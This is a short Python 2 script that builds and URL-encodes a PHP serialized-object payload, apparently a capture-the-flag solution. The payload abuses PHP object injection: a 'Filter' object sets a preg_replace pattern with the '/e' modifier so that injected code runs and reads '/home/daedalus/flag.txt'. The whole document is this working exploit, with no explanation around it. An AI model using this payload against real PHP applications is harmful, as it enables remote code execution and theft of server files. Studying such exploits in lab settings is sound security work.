import urllib

x = """b:1;\nO:4:"Post":3:{s:8:"*title";s:5:"title";s:7:"*text";s:49:"file_get_contents('/home/daedalus/flag.txt',true)";s:10:"*filters";a:1:{i:0;O:6:"Filter":2:{s:10:"*pattern";s:8:"/^(.*)/e";s:7:"*repl";s:15:"strtoupper(\\\\1)";}}}"""

print urllib.quote_plus(x)
